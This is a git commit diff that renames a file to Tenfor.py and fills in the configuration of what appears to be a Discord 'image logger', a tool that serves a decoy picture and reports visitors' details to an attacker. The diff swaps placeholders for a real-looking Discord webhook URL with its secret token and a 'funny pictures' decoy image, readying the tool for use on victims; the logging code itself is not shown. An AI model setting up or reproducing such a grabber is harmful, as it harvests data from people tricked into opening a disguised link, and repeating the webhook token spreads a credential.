816cdcb12725e59c9a83d9c6be0a5e4d0ebf660e
Lookah <emersonorr2024@icloud.com>
2025-02-12 17:27:36 -0500

    Update and rename Image.py to Tenfor.py

--- api/Tenfor.py
+++ api/Tenfor.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1337122866478714921/GDhQr_PWh_EVPSqxOqS_Cu-abqrTvYQiIaIxNHabupa1Ph9xrAkkFRD94wMG9O312t4Z",
+    "image": "https://wallpapers.com/images/featured/funny-pictures-dzujtlgoq3utq7j4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
